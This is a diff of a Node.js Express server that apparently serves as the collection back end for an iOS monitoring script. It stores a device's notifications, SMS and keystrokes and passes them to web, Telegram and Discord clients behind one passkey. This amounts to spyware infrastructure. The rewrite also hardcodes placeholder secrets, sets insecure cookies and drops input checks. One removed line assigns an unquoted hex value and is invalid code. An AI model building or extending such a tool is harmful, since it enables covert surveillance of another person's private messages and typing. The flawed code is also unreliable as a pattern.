@@ -1,29 +1,23 @@
-// server.js
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
 const session = require('express-session');
-const FileStore = require('session-file-store')(session); // File-based session storage
-require('dotenv').config(); // Load environment variables
-
 const app = express();
 
-// Middleware setup
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Session configuration with FileStore
 app.use(session({
-    store: new FileStore({ path: './sessions' }), // Specify the directory for session files
-    secret: process.env.SESSION_SECRET || 'default_secret',
+    secret: 'your_secret_key', // Replace with a strong secret in production
     resave: false,
     saveUninitialized: true,
-    cookie: { secure: process.env.NODE_ENV === 'production' }
+    cookie: { secure: false } // Set to true if using HTTPS
 }));
 
-// Your activity tracking data and routes
-const correctPasskey = 9ecd92e21bb795a6064f1c9c6cc4fb9b || "default_passkey";
+// Replace with your actual passkey
+const correctPasskey = "your_secure_passkey";
+
 let activityData = {
     Notifications: '',
     SMS: '',
@@ -35,71 +29,61 @@ let activityData = {
     Keystrokes: ''
 };
 
-// Login endpoint
+// Login endpoint to authenticate the user
 app.post('/login', (req, res) => {
     const { passkey } = req.body;
-    console.log("Received passkey:", passkey); // Debug: log the received passkey
-    console.log("Correct passkey:", correctPasskey); // Debug: log the expected correct passkey
     
+    // Check if passkey matches
     if (passkey === correctPasskey) {
-        req.session.authenticated = true;
+        req.session.authenticated = true; // Set session auth flag
         res.status(200).json({ message: "Login successful" });
     } else {
-        console.log("Login failed: Incorrect passkey"); // Debug: log failed login attempt
         res.status(401).json({ message: "Incorrect passkey" });
     }
 });
 
 // Middleware to check if user is authenticated
 function isAuthenticated(req, res, next) {
-    console.log("Checking authentication for session:", req.session); // Debug: log the current session
     if (req.session.authenticated) {
         next();
     } else {
-        console.log("Unauthorized access attempt"); // Debug: log unauthorized access
         res.status(401).json({ message: "Unauthorized" });
     }
 }
 
-// Endpoint to receive monitoring data
+// Endpoint for iOS Monitoring Script to send data
 app.post('/monitor', isAuthenticated, (req, res) => {
     const { activityType, data } = req.body;
-    console.log("Received monitoring data:", { activityType, data }); // Debug: log received data
     if (activityType && activityData[activityType] !== undefined) {
         activityData[activityType] = data;
         res.sendStatus(200);
     } else {
-        console.log("Invalid activity type received:", activityType); // Debug: log invalid activity type
-        res.status(400).json({ message: "Invalid activity type" });
+        res.sendStatus(400);
     }
 });
 
-// Endpoint to fetch activity data for authenticated clients
+// Endpoint for clients (Web UI, Telegram, Discord) to fetch data for a specific activity
 app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
     const { activityType } = req.params;
-    if (activityData[activityType] !== undefined) {
-        res.json({ data: activityData[activityType] || "No data available" });
-    } else {
-        console.log("Invalid activity type requested:", activityType); // Debug: log invalid request
-        res.status(400).json({ message: "Invalid activity type" });
-    }
+    res.json({ data: activityData[activityType] || "No data available" });
 });
 
 // Endpoint to check authentication status
 app.get('/auth-status', (req, res) => {
-    res.status(200).json({ authenticated: !!req.session.authenticated });
+    if (req.session.authenticated) {
+        res.status(200).json({ authenticated: true });
+    } else {
+        res.status(401).json({ authenticated: false });
+    }
 });
 
 // Logout endpoint
 app.post('/logout', (req, res) => {
     req.session.destroy(() => {
-        console.log("User logged out successfully"); // Debug: log successful logout
         res.status(200).json({ message: "Logged out" });
     });
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+app.listen(3000, () => {
+    console.log('Server running on http://localhost:3000');
 });
